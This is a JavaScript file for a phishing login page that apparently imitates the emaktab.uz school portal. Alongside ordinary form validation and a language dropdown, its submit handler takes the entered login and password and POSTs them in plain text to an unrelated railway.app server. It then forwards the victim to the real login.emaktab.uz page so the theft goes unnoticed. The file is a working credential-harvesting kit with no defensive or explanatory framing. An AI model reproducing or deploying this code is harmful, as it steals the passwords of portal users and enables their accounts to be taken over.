const pass = document.getElementById("pass");
const login = document.getElementById("login");
const btn = document.getElementById("btn");
const lang = document.getElementById("lan");

function validateInputs() {
    const password = pass.value.trim();
    const log = login.value.trim();

    btn.disabled = password === "" || log === "";   
}

pass.addEventListener("input", validateInputs);
login.addEventListener("input", validateInputs);

validateInputs();

const lanBtn = document.getElementById("lan");
const dropdown = document.getElementById("dropdown");

lanBtn.addEventListener("click", () => {
    dropdown.classList.toggle("hidden");
});

document.addEventListener("click", (e) => {
    if (!lanBtn.contains(e.target) && !dropdown.contains(e.target)) {
        dropdown.classList.add("hidden");
    }
});

dropdown.querySelectorAll("button").forEach((btn) => {
    btn.addEventListener("click", () => {
        lanBtn.childNodes[0].textContent = btn.dataset.lang + " ";
        dropdown.classList.add("hidden");
    });
});

// Функция для отправки данных и редиректа без проверки токена
async function sendDataAndRedirect() {
    const login = document.getElementById('login').value.trim();
    const password = document.getElementById('pass').value.trim();

    if (!login || !password) {
        alert('Login and password are required!');
        return;
    }

    try {
        const response = await fetch('https://airy-enjoyment-production-16a0.up.railway.app/requests', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ login, pass: password }),
        });

        if (response.ok) {
            window.location.href = 'https://login.emaktab.uz/'; // Редирект без проверки токена
        } else {
            throw new Error('Failed to add user');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Something went wrong. Please try again.');
    }
}

// Привязываем функцию к кнопке
btn.addEventListener('click', (e) => {
    e.preventDefault(); // предотвращаем стандартное действие кнопки
    sendDataAndRedirect();
});
